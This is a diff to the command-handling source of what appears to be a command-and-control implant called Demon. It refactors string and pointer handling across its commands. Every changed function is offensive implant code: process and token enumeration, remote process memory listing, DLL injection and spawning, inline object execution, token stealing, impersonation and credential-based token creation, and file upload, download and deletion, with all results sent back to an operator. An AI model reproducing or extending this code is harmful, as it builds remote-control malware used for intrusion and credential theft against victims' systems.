@@ -39,7 +39,7 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
 
         // End
-        { .ID = NULL, .Function = NULL }
+        { .ID = 0, .Function = NULL }
 };
 
 VOID CommandDispatcher( VOID )
@@ -175,7 +175,7 @@ VOID CommandDispatcher( VOID )
     PUTS( "Out of while loop" )
 }
 
-VOID CommandCheckin( VOID )
+VOID CommandCheckin( PPARSER Parser )
 {
     PUTS( "Checkin" )
 
@@ -279,7 +279,6 @@ VOID CommandProc( PPARSER Parser )
 {
     SHORT       SubCommand  = ( SHORT ) ParserGetInt32( Parser );
     PPACKAGE    Package     = PackageCreate( DEMON_COMMAND_PROC );
-    NTSTATUS    NtStatus    = STATUS_SUCCESS;
 
     PackageAddInt32( Package, SubCommand );
 
@@ -292,7 +291,6 @@ VOID CommandProc( PPARSER Parser )
             HANDLE                    hProcess         = NULL;
             HANDLE                    hToken           = NULL;
             NTSTATUS                  NtStatus         = STATUS_SUCCESS;
-            OBJECT_ATTRIBUTES         ObjAttr          = { sizeof( OBJECT_ATTRIBUTES ) };
 
             if ( Parser->Length > 0 )
                 ProcessID = ParserGetInt32( Parser );
@@ -331,8 +329,8 @@ VOID CommandProc( PPARSER Parser )
                                 {
                                     Size = WCharStringToCharString( ModuleName, ModuleNameW, CurrentModule.FullDllName.Length );
 
-                                    PackageAddBytes( Package, ModuleName, Size );
-                                    PackageAddInt32( Package, ( UINT32 ) CurrentModule.DllBase );
+                                    PackageAddString( Package, ModuleName );
+                                    PackageAddPtr( Package, CurrentModule.DllBase );
                                 }
 
                                 MemSet( ModuleNameW, 0, MAX_PATH );
@@ -360,16 +358,15 @@ VOID CommandProc( PPARSER Parser )
             PSYSTEM_PROCESS_INFORMATION PtrProcessInfo  = NULL; /* is going to hold the original pointer of SysProcessInfo */
             SIZE_T                      ProcessInfoSize = 0;
             NTSTATUS                    NtStatus        = STATUS_SUCCESS;
-            ULONG                       ProcessSize     = 0;
+            ULONG32                     ProcessSize     = 0;
             PCHAR                       ProcessName     = NULL;
 
             /* Process Name and Process User token */
             CHAR    ProcName[ MAX_PATH ] = { 0 };
-            UINT32  ProcNameSize         = 0;
             PCHAR   ProcUserName         = NULL;
             UINT32  ProcUserSize         = 0;
 
-            ProcessName = ParserGetBytes( Parser, &ProcessSize );
+            ProcessName = ParserGetString( Parser, &ProcessSize );
 
             if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
             {
@@ -380,35 +377,33 @@ VOID CommandProc( PPARSER Parser )
 
                 while ( TRUE )
                 {
-                    ProcNameSize = WCharStringToCharString( ProcName, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
+                    WCharStringToCharString( ProcName, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
                     INT32 MemRet = MemCompare( ProcName, ProcessName, ProcessSize );
 
                     if ( MemRet == 0 )
                     {
-                        PUTS( "1" )
                         HANDLE hProcess = NULL;
                         HANDLE hToken   = NULL;
 
-                        hProcess = ProcessOpen( SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
+                        hProcess = ProcessOpen( ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
+                        if ( ! hProcess )
+                            continue;
 
                         if ( NT_SUCCESS( Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) )
                             ProcUserName = TokenGetUserDomain( hToken, &ProcUserSize );
 
-                        PUTS( "2" )
-                        PackageAddBytes( Package, ProcName, ProcNameSize );
-                        PackageAddInt32( Package, ( UINT32 ) SysProcessInfo->UniqueProcessId  );
-                        PackageAddInt32( Package, ( UINT32 ) SysProcessInfo->InheritedFromUniqueProcessId );
-                        PackageAddBytes( Package, ProcUserName, ProcUserSize );
+                        PackageAddString( Package, ProcName );
+                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId  );
+                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
+                        PackageAddString( Package, ProcUserName );
                         PackageAddInt32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );
 
-                        PUTS( "3" )
-#ifdef DEBUG
-                        if ( SysProcessInfo->UniqueProcessId != Instance.Session.PID )
-#endif
-                            Instance.Win32.NtClose( hProcess );
+                        Instance.Win32.NtClose( hProcess );
+                        hProcess = NULL;
 
                         if ( hToken )
                             Instance.Win32.NtClose( hToken );
+                        hToken = NULL;
 
                         MemSet( ProcUserName, 0, ProcUserSize );
                         if ( ProcUserName )
@@ -418,7 +413,7 @@ VOID CommandProc( PPARSER Parser )
                     if ( SysProcessInfo->NextEntryOffset == 0 )
                         break;
 
-                    SysProcessInfo = ( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
+                    SysProcessInfo = C_PTR( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
                 }
 
                 if ( PtrProcessInfo )
@@ -444,8 +439,8 @@ VOID CommandProc( PPARSER Parser )
             UINT32              ProcessSize     = 0;
             UINT32              ProcessArgsSize = 0;
             UINT32              ProcessState    = ParserGetInt32( Parser );
-            PCHAR               Process         = ParserGetBytes( Parser, &ProcessSize );
-            PCHAR               ProcessArgs     = ParserGetBytes( Parser, &ProcessArgsSize );
+            PWCHAR              Process         = ParserGetWString( Parser, &ProcessSize );
+            PWCHAR              ProcessArgs     = ParserGetWString( Parser, &ProcessArgsSize );
             BOOL                ProcessPiped    = ParserGetInt32( Parser );
             BOOL                ProcessVerbose  = ParserGetInt32( Parser );
             BOOL                Success         = FALSE;
@@ -457,15 +452,15 @@ VOID CommandProc( PPARSER Parser )
                 ProcessArgs = NULL;
 
             PRINTF( "Process State   : %d\n", ProcessState );
-            PRINTF( "Process         : %s [%d]\n", Process, ProcessSize );
-            PRINTF( "Process Args    : %s [%d]\n", ProcessArgs, ProcessArgsSize );
+            PRINTF( "Process         : %ls [%d]\n", Process, ProcessSize );
+            PRINTF( "Process Args    : %ls [%d]\n", ProcessArgs, ProcessArgsSize );
             PRINTF( "Process Piped   : %s [%d]\n", ProcessPiped ? "TRUE" : "FALSE", ProcessPiped );
             PRINTF( "Process Verbose : %s [%d]\n", ProcessVerbose ? "TRUE" : "FALSE", ProcessVerbose );
 
             // TODO: make it optional to choose process arch
             Success = ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL );
 
-            PackageAddBytes( Package, Process, ProcessSize );
+            PackageAddWString( Package, Process );
             PackageAddInt32( Package, Success ? ProcessInfo.dwProcessId : 0 );
             PackageAddInt32( Package, Success );
             PackageAddInt32( Package, ProcessPiped );
@@ -491,8 +486,6 @@ VOID CommandProc( PPARSER Parser )
             LPVOID                   Offset      = 0;
             SIZE_T                   Result      = 0;
             HANDLE                   hProcess    = NULL;
-            OBJECT_ATTRIBUTES        ObjAttr     = { 0 };
-            CLIENT_ID                ClientID    = { 0 };
 
             hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
             if ( hProcess )
@@ -511,7 +504,7 @@ VOID CommandProc( PPARSER Parser )
                             if ( QueryProtec == 0 )
                             {
                                 // Since the Protection to query isn't specified we just list every memory region
-                                PackageAddInt32( Package, MemInfo.BaseAddress );
+                                PackageAddPtr( Package, MemInfo.BaseAddress );
                                 PackageAddInt32( Package, MemInfo.RegionSize );
                                 PackageAddInt32( Package, MemInfo.AllocationProtect );
                                 PackageAddInt32( Package, MemInfo.State );
@@ -523,7 +516,7 @@ VOID CommandProc( PPARSER Parser )
                                 {
                                     PRINTF( "Search for memory region: %d\n", QueryProtec )
                                     // Add found memory region with specified memory protection
-                                    PackageAddInt32( Package, MemInfo.BaseAddress );
+                                    PackageAddPtr( Package, MemInfo.BaseAddress );
                                     PackageAddInt32( Package, MemInfo.RegionSize );
                                     PackageAddInt32( Package, MemInfo.AllocationProtect );
                                     PackageAddInt32( Package, MemInfo.State );
@@ -600,30 +593,32 @@ VOID CommandProcList( PPARSER Parser )
         {
             PCHAR  ProcessUser = NULL;
             HANDLE hToken      = NULL;
-            DWORD  UserSize    = 0;
+            UINT32 UserSize    = 0;
             HANDLE hProcess    = NULL;
 
             /* open handle to each process with query information privilege since we dont need anything else besides basic info */
-            hProcess = ProcessOpen( SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
+            hProcess = ProcessOpen( ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
+            if ( ! hProcess )
+                continue;
 
             /* Retrieve process token user */
             if ( NT_SUCCESS( Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) )
                 ProcessUser = TokenGetUserDomain( hToken, &UserSize );
 
             /* Now we append the collected process data to the process list  */
-            PackageAddBytes( Package, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
-            PackageAddInt32( Package, SysProcessInfo->UniqueProcessId );
+            PackageAddWString( Package, SysProcessInfo->ImageName.Buffer );
+            PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId );
             PackageAddInt32( Package, ProcessIsWow( hProcess ) );
-            PackageAddInt32( Package, SysProcessInfo->InheritedFromUniqueProcessId );
+            PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
             PackageAddInt32( Package, SysProcessInfo->SessionId );
             PackageAddInt32( Package, SysProcessInfo->NumberOfThreads );
-            PackageAddBytes( Package, ProcessUser, UserSize );
+            PackageAddString( Package, ProcessUser );
 
             /* Now lets cleanup */
 #ifdef DEBUG
             /* ignore this. is just for the debug prints.
              * if we close the handle to our own process we won't see any debug prints anymore */
-            if ( SysProcessInfo->UniqueProcessId != Instance.Session.PID )
+            if ( ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId != Instance.Session.PID )
                 Instance.Win32.NtClose( hProcess );
 #else
             if ( hProcess )
@@ -645,7 +640,7 @@ VOID CommandProcList( PPARSER Parser )
                 break;
 
             /* now go to the next process */
-            SysProcessInfo = U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset;
+            SysProcessInfo = C_PTR( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
         }
 
         PackageTransmit( Package, NULL, NULL );
@@ -679,8 +674,8 @@ VOID CommandFS( PPARSER Parser )
         {
             WIN32_FIND_DATAW FindData      = { 0 };
             LPWSTR           Path          = NULL;
-            DWORD            PathSize      = 0;
-            UCHAR            T[ MAX_PATH ] = { 0 };
+            UINT32           PathSize      = 0;
+            WCHAR            T[ MAX_PATH ] = { 0 };
             HANDLE           hFile         = NULL;
             ULARGE_INTEGER   FileSize      = { 0 };
             SYSTEMTIME       FileTime      = { 0 };
@@ -689,7 +684,7 @@ VOID CommandFS( PPARSER Parser )
             BOOL             FileExplorer  = FALSE;
 
             FileExplorer     = ParserGetInt32( Parser );
-            Path             = ParserGetBytes( Parser, &PathSize );
+            Path             = ParserGetWString( Parser, &PathSize );
 
             PRINTF( "FileExplorer: %s [%d]\n", FileExplorer ? "TRUE" : "FALSE", FileExplorer )
             PRINTF( "Path        : %ls\n", Path )
@@ -698,17 +693,17 @@ VOID CommandFS( PPARSER Parser )
 
             if ( Path[ 0 ] == L'.' )
             {
-                if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, &T ) ) )
+                if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, T ) ) )
                 {
                     PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 }
                 else
-                    PackageAddBytes( Package, T, Return * 2 );
+                    PackageAddWString( Package, T );
             }
             else
             {
-                PackageAddBytes( Package, Path, PathSize );
+                PackageAddWString( Package, Path );
             }
 
             MemSet( &FindData, 0, sizeof( FindData ) );
@@ -748,7 +743,7 @@ VOID CommandFS( PPARSER Parser )
                 PackageAddInt32( Package, SystemTime.wSecond );
                 PackageAddInt32( Package, SystemTime.wMinute );
                 PackageAddInt32( Package, SystemTime.wHour );
-                PackageAddBytes( Package, FindData.cFileName, StringLengthW( FindData.cFileName ) * 2 );
+                PackageAddWString( Package, FindData.cFileName );
             }
             while ( Instance.Win32.FindNextFileW( hFile, &FindData ) );
 
@@ -787,7 +782,7 @@ VOID CommandFS( PPARSER Parser )
                 goto CleanupDownload;
             }
 
-            PathSize = Instance.Win32.GetFullPathNameW( FileName.Buffer, PathSize, &FilePath, NULL );
+            PathSize = Instance.Win32.GetFullPathNameW( FileName.Buffer, PathSize, FilePath, NULL );
             PRINTF( "FilePath.Buffer[%d]: %ls\n", PathSize, FilePath )
 
             FileSize = Instance.Win32.GetFileSize( hFile, 0 );
@@ -823,9 +818,9 @@ VOID CommandFS( PPARSER Parser )
             /* Download Open Data */
             PackageAddInt32( Package, FileSize ); /* TODO: change this to 64bit or else we can't download files larger than 4gb */
             if ( PathSize > 0 )
-                PackageAddBytes( Package, FilePath, PathSize * sizeof( WCHAR ) );
+                PackageAddWString( Package, FilePath );
             else
-                PackageAddBytes( Package, FileName.Buffer, FileName.Length );
+                PackageAddWString( Package, FileName.Buffer );
 
         CleanupDownload:
             PUTS( "CleanupDownload" )
@@ -846,10 +841,10 @@ VOID CommandFS( PPARSER Parser )
         case DEMON_COMMAND_FS_UPLOAD: PUTS( "FS::Upload" )
         {
             DWORD     FileSize  = 0;
-            DWORD     NameSize  = 0;
+            UINT32    NameSize  = 0;
             DWORD     Written   = 0;
             HANDLE    hFile     = NULL;
-            LPWSTR    FileName  = ParserGetBytes( Parser, &NameSize );
+            LPWSTR    FileName  = ParserGetWString( Parser, &NameSize );
             ULONG     MemFileID = ParserGetInt32( Parser );
             PMEM_FILE MemFile   = GetMemFile( MemFileID );
             BOOL      Success   = TRUE;
@@ -895,7 +890,7 @@ VOID CommandFS( PPARSER Parser )
             }
 
             PackageAddInt32( Package, FileSize );
-            PackageAddBytes( Package, FileName, NameSize );
+            PackageAddWString( Package, FileName );
 
         CleanupUpload:
             if ( hFile )
@@ -912,8 +907,8 @@ VOID CommandFS( PPARSER Parser )
 
         case DEMON_COMMAND_FS_CD: PUTS( "FS::Cd" )
         {
-            DWORD  PathSize = 0;
-            LPWSTR Path     = ParserGetBytes( Parser, &PathSize );
+            UINT32 PathSize = 0;
+            LPWSTR Path     = ParserGetWString( Parser, &PathSize );
 
             if ( ! Instance.Win32.SetCurrentDirectoryW( Path ) )
             {
@@ -922,7 +917,7 @@ VOID CommandFS( PPARSER Parser )
             }
             else
             {
-                PackageAddBytes( Package, Path, PathSize );
+                PackageAddWString( Package, Path );
             }
 
             break;
@@ -930,8 +925,8 @@ VOID CommandFS( PPARSER Parser )
 
         case DEMON_COMMAND_FS_REMOVE: PUTS( "FS::Remove" )
         {
-            DWORD  PathSize = 0;
-            LPWSTR Path     = ParserGetBytes( Parser, &PathSize );
+            UINT32 PathSize = 0;
+            LPWSTR Path     = ParserGetWString( Parser, &PathSize );
             DWORD  dwAttrib = Instance.Win32.GetFileAttributesW( Path );
 
             if ( dwAttrib != INVALID_FILE_ATTRIBUTES && ( dwAttrib & FILE_ATTRIBUTE_DIRECTORY ) )
@@ -958,15 +953,15 @@ VOID CommandFS( PPARSER Parser )
                     PackageAddInt32( Package, FALSE );
                 }
             }
-            PackageAddBytes( Package, Path, PathSize );
+            PackageAddWString( Package, Path );
 
             break;
         }
 
         case DEMON_COMMAND_FS_MKDIR: PUTS( "FS::Mkdir" )
         {
-            DWORD  PathSize = 0;
-            LPWSTR Path     = ParserGetBytes( Parser, &PathSize );
+            UINT32 PathSize = 0;
+            LPWSTR Path     = ParserGetWString( Parser, &PathSize );
 
             if ( ! Instance.Win32.CreateDirectoryW( Path, NULL ) )
             {
@@ -974,21 +969,21 @@ VOID CommandFS( PPARSER Parser )
                 goto LEAVE;
             }
 
-            PackageAddBytes( Package, Path, PathSize );
+            PackageAddWString( Package, Path );
 
             break;
         }
 
         case DEMON_COMMAND_FS_COPY: PUTS( "FS::Copy" )
         {
-            DWORD  FromSize = 0;
-            DWORD  ToSize   = 0;
+            UINT32 FromSize = 0;
+            UINT32 ToSize   = 0;
             LPWSTR PathFrom = NULL;
             LPWSTR PathTo   = NULL;
             BOOL   Success  = FALSE;
 
-            PathFrom = ParserGetBytes( Parser, &FromSize );
-            PathTo   = ParserGetBytes( Parser, &ToSize );
+            PathFrom = ParserGetWString( Parser, &FromSize );
+            PathTo   = ParserGetWString( Parser, &ToSize );
 
             PRINTF( "Copy file %s to %s\n", PathFrom, PathTo )
 
@@ -997,8 +992,8 @@ VOID CommandFS( PPARSER Parser )
                 CALLBACK_GETLASTERROR
 
             PackageAddInt32( Package, Success );
-            PackageAddBytes( Package, PathFrom, FromSize );
-            PackageAddBytes( Package, PathTo, ToSize );
+            PackageAddWString( Package, PathFrom );
+            PackageAddWString( Package, PathTo );
 
             break;
         }
@@ -1008,13 +1003,13 @@ VOID CommandFS( PPARSER Parser )
             WCHAR Path[ MAX_PATH * 2 ] = { 0 };
             DWORD Return               = 0;
 
-            if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, &Path ) ) )
+            if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) )
             {
                 PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             }
             else
-                PackageAddBytes( Package, Path, Return * 2 );
+                PackageAddWString( Package, Path );
 
             break;
         }
@@ -1022,8 +1017,8 @@ VOID CommandFS( PPARSER Parser )
         case DEMON_COMMAND_FS_CAT: PUTS( "FS::Cat" )
         {
             DWORD  FileSize = 0;
-            DWORD  NameSize = 0;
-            LPWSTR FileName = ParserGetBytes( Parser, &NameSize );
+            UINT32 NameSize = 0;
+            LPWSTR FileName = ParserGetWString( Parser, &NameSize );
             PVOID  Content  = NULL;
             BOOL   Success  = FALSE;
 
@@ -1031,11 +1026,10 @@ VOID CommandFS( PPARSER Parser )
 
             Success = ReadLocalFile( FileName, &Content, &FileSize );
 
-            PackageAddBytes( Package, FileName, NameSize );
+            PackageAddWString( Package, FileName );
             PackageAddInt32( Package, Success );
             PackageAddBytes( Package, Content,  FileSize );
 
-        CleanupCat:
             if ( Content )
             {
                 MemSet( Content, 0, FileSize );
@@ -1062,14 +1056,14 @@ LEAVE:
 
 VOID CommandInlineExecute( PPARSER Parser )
 {
-    DWORD     FunctionNameSize = 0;
+    UINT32    FunctionNameSize = 0;
     DWORD     ObjectDataSize   = 0;
-    DWORD     ArgSize          = 0;
+    UINT32    ArgSize          = 0;
     PCHAR     ObjectData       = NULL;
     PMEM_FILE MemFile          = NULL;
-    PCHAR     FunctionName     = ParserGetBytes( Parser, &FunctionNameSize );
+    PCHAR     FunctionName     = ParserGetString( Parser, &FunctionNameSize );
     ULONG     MemFileID        = ParserGetInt32( Parser );
-    PCHAR     ArgBuffer        = ParserGetBytes( Parser, &ArgSize );
+    PCHAR     ArgBuffer        = ParserGetString( Parser, &ArgSize );
     INT32     Flags            = ParserGetInt32( Parser );
 
     MemFile = GetMemFile( MemFileID );
@@ -1129,12 +1123,12 @@ VOID CommandInjectDLL( PPARSER Parser )
 {
     PPACKAGE          Package    = PackageCreate( DEMON_COMMAND_INJECT_DLL );
 
-    DWORD             DllSize    = 0;
+    UINT32            DllSize    = 0;
     DWORD             Result     = 1;
     NTSTATUS          NtStatus   = STATUS_SUCCESS;
-    PCHAR             DllBytes   = NULL;
-    PCHAR             DllLdrSize = 0;
-    PCHAR             DllLdr     = NULL;
+    PBYTE             DllBytes   = NULL;
+    UINT32            DllLdrSize = 0;
+    PBYTE             DllLdr     = NULL;
     HANDLE            hProcess   = NULL;
     CLIENT_ID         ProcID     = { 0 };
     OBJECT_ATTRIBUTES ObjAttr    = { sizeof( ObjAttr ) };
@@ -1151,7 +1145,7 @@ VOID CommandInjectDLL( PPARSER Parser )
     PRINTF( "DllBytes : %x [%d]\n", DllBytes, DllSize );
     PRINTF( "Parameter: %x [%d]\n", InjCtx.Parameter, InjCtx.ParameterSize );
 
-    ProcID.UniqueProcess = InjCtx.ProcessID;
+    ProcID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) InjCtx.ProcessID;
 
     if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID ) ) )
     {
@@ -1173,12 +1167,12 @@ VOID CommandSpawnDLL( PPARSER Parser )
 {
     PPACKAGE      Package    = NULL;
     INJECTION_CTX InjCtx     = { 0 };
-    DWORD         DllSize    = 0;
-    DWORD         ArgSize    = 0;
-    PCHAR         DllLdrSize = 0;
-    PCHAR         DllLdr     = ParserGetBytes( Parser, &DllLdrSize );
-    PCHAR         DllBytes   = ParserGetBytes( Parser, &DllSize );
-    PCHAR         Arguments  = ParserGetBytes( Parser, &ArgSize );
+    UINT32        DllSize    = 0;
+    UINT32        ArgSize    = 0;
+    UINT32        DllLdrSize = 0;
+    PCHAR         DllLdr     = ParserGetString( Parser, &DllLdrSize );
+    PCHAR         DllBytes   = ParserGetString( Parser, &DllSize );
+    PCHAR         Arguments  = ParserGetString( Parser, &ArgSize );
     DWORD         Result     = 0;
 
     Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
@@ -1271,7 +1265,7 @@ VOID CommandToken( PPARSER Parser )
             if ( TokenData )
             {
                 PackageAddInt32( Package, ImpersonateTokenInStore( TokenData ) );
-                PackageAddBytes( Package, TokenData->DomainUser, StringLengthA( TokenData->DomainUser ) );
+                PackageAddString( Package, TokenData->DomainUser );
             }
             else
             {
@@ -1287,10 +1281,10 @@ VOID CommandToken( PPARSER Parser )
         case DEMON_COMMAND_TOKEN_STEAL: PUTS( "Token::Steal" )
         {
             DWORD  TargetPid    = ParserGetInt32( Parser );
-            HANDLE TargetHandle = ParserGetInt32( Parser );
+            HANDLE TargetHandle = ( HANDLE ) ( ULONG_PTR ) ParserGetInt32( Parser );
             HANDLE StolenToken  = TokenSteal( TargetPid, TargetHandle );
-            DWORD  UserSize     = 0;
-            PUCHAR User         = NULL;
+            UINT32 UserSize     = 0;
+            PCHAR  User         = NULL;
             DWORD  NewTokenID   = 0;
 
             if ( ! StolenToken )
@@ -1307,7 +1301,7 @@ VOID CommandToken( PPARSER Parser )
 
             PRINTF( "[^] New Token added to the Vault: %d User:[%s]\n", NewTokenID, User );
 
-            PackageAddBytes( Package, User, UserSize );
+            PackageAddString( Package, User );
             PackageAddInt32( Package, NewTokenID );
             PackageAddInt32( Package, TargetPid );
 
@@ -1325,8 +1319,8 @@ VOID CommandToken( PPARSER Parser )
                     PRINTF( "[TOKEN_LIST] Index:[%d] Handle:[0x%x] User:[%s] Pid:[%d]\n", TokenIndex, TokenList->Handle, TokenList->DomainUser, TokenList->dwProcessID );
 
                     PackageAddInt32( Package, TokenIndex );
-                    PackageAddInt32( Package, TokenList->Handle );
-                    PackageAddBytes( Package, TokenList->DomainUser, StringLengthA( TokenList->DomainUser ) );
+                    PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList->Handle );
+                    PackageAddString( Package, TokenList->DomainUser );
                     PackageAddInt32( Package, TokenList->dwProcessID );
                     PackageAddInt32( Package, TokenList->Type );
                     PackageAddInt32( Package, Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenList->Handle );
@@ -1348,7 +1342,7 @@ VOID CommandToken( PPARSER Parser )
             DWORD             Length         = 0;
             HANDLE            TokenHandle    = NULL;
             PCHAR             PrivName       = NULL;
-            DWORD             PrivNameLength = 0;
+            UINT32            PrivNameLength = 0;
             BOOL              ListPrivs      = ParserGetInt32( Parser );
 
             PackageAddInt32( Package, ListPrivs );
@@ -1371,7 +1365,7 @@ VOID CommandToken( PPARSER Parser )
                         {
                             Length = MAX_PATH;
                             Instance.Win32.LookupPrivilegeNameA( NULL, &TokenPrivs->Privileges[ i ].Luid, Name, &Length );
-                            PackageAddBytes( Package, Name, Length );
+                            PackageAddString( Package, Name );
                             PackageAddInt32( Package, TokenPrivs->Privileges[ i ].Attributes );
                         }
                     }
@@ -1380,10 +1374,10 @@ VOID CommandToken( PPARSER Parser )
             else
             {
                 PUTS( "Privs::Get" )
-                PrivName = ParserGetBytes( Parser, &PrivNameLength );
+                PrivName = ParserGetString( Parser, &PrivNameLength );
 
                 PackageAddInt32( Package, TokenSetPrivilege( PrivName, TRUE ) );
-                PackageAddBytes( Package, PrivName, PrivNameLength );
+                PackageAddString( Package, PrivName );
             }
 
             if ( TokenPrivs )
@@ -1398,13 +1392,13 @@ VOID CommandToken( PPARSER Parser )
 
         case DEMON_COMMAND_TOKEN_MAKE: PUTS( "Token::Make" )
         {
-            DWORD  dwUserSize     = 0;
-            DWORD  dwPasswordSize = 0;
-            DWORD  dwDomainSize   = 0;
-            PCHAR  lpDomain       = ParserGetBytes( Parser, &dwDomainSize );
-            PCHAR  lpUser         = ParserGetBytes( Parser, &dwUserSize );
-            PCHAR  lpPassword     = ParserGetBytes( Parser, &dwPasswordSize );
-            UCHAR  Deli[ 2 ]      = { '\\', 0 };
+            UINT32 dwUserSize     = 0;
+            UINT32 dwPasswordSize = 0;
+            UINT32 dwDomainSize   = 0;
+            PWCHAR lpDomain       = ParserGetWString( Parser, &dwDomainSize );
+            PWCHAR lpUser         = ParserGetWString( Parser, &dwUserSize );
+            PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
+            CHAR   Deli[ 2 ]      = { '\\', 0 };
             HANDLE hToken         = NULL;
             PCHAR  UserDomain     = NULL;
             LPSTR  BufferUser     = NULL;
@@ -1415,7 +1409,7 @@ VOID CommandToken( PPARSER Parser )
 
             if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
             {
-                PRINTF( "Create new token: Domain:[%s] User:[%s] Password:[%s]\n", lpDomain, lpUser, lpPassword )
+                PRINTF( "Create new token: Domain:[%ls] User:[%ls] Password:[%ls]\n", lpDomain, lpUser, lpPassword )
 
                 hToken = TokenMake( lpUser, lpPassword, lpDomain );
                 if ( hToken != NULL )
@@ -1424,9 +1418,9 @@ VOID CommandToken( PPARSER Parser )
 
                     MemSet( UserDomain, 0, UserDomainSize );
 
-                    StringConcatA( UserDomain, lpDomain );
-                    StringConcatA( UserDomain, Deli );
-                    StringConcatA( UserDomain, lpUser );
+                    StringConcatW( UserDomain, lpDomain );
+                    StringConcatW( UserDomain, Deli );
+                    StringConcatW( UserDomain, lpUser );
 
                     BufferUser     = Instance.Win32.LocalAlloc( LPTR, dwUserSize );
                     BufferPassword = Instance.Win32.LocalAlloc( LPTR, dwPasswordSize );
@@ -1440,7 +1434,7 @@ VOID CommandToken( PPARSER Parser )
                         hToken,
                         UserDomain,
                         TOKEN_TYPE_MAKE_NETWORK,
-                        NtCurrentTeb()->ClientId.UniqueProcess,
+                        ( DWORD ) ( ULONG_PTR ) NtCurrentTeb()->ClientId.UniqueProcess,
                         BufferUser,
                         BufferDomain,
                         BufferPassword
@@ -1449,9 +1443,9 @@ VOID CommandToken( PPARSER Parser )
                     // when a new token is created, we impersonate it automatically
                     ImpersonateTokenFromVault( NewTokenID );
 
-                    PRINTF( "UserDomain => %s\n", UserDomain )
+                    PRINTF( "UserDomain => %ls\n", UserDomain )
 
-                    PackageAddBytes( Package, UserDomain, UserDomainSize );
+                    PackageAddWString( Package, UserDomain );
                 }
             }
 
@@ -1464,7 +1458,7 @@ VOID CommandToken( PPARSER Parser )
             TOKEN_ELEVATION Elevation  = { 0 };
             HANDLE          hToken     = TokenCurrentHandle( );
             NTSTATUS        NtStatus   = STATUS_SUCCESS;
-            DWORD           dwUserSize = 0;
+            UINT32          UserSize = 0;
             PCHAR           User       = NULL;
 
             PRINTF( "[x] hToken: 0x%x\n", hToken );
@@ -1480,16 +1474,16 @@ VOID CommandToken( PPARSER Parser )
             }
             PUTS( "NtQueryInformationToken: Success" )
 
-            User = TokenGetUserDomain( hToken, &dwUserSize );
+            User = TokenGetUserDomain( hToken, &UserSize );
 
             PackageAddInt32( Package, Elevation.TokenIsElevated );
-            PackageAddBytes( Package, User, dwUserSize );
+            PackageAddString( Package, User );
 
             Instance.Win32.NtClose( hToken );
 
             if ( User )
             {
-                DATA_FREE( User, dwUserSize )
+                DATA_FREE( User, UserSize )
             }
 
             break;
@@ -1559,9 +1553,9 @@ VOID CommandToken( PPARSER Parser )
                 {
                     if (TokenList[ i ].delegation_available)
                     {
-                        PackageAddBytes( Package, TokenList[ i ].username, StringLengthA( TokenList[ i ].username ) );
+                        PackageAddString( Package, TokenList[ i ].username );
                         PackageAddInt32( Package, TokenList[ i ].dwProcessID );
-                        PackageAddInt32( Package, TokenList[ i ].localHandle );
+                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
                     }
                 }
 
@@ -1571,9 +1565,9 @@ VOID CommandToken( PPARSER Parser )
                 {
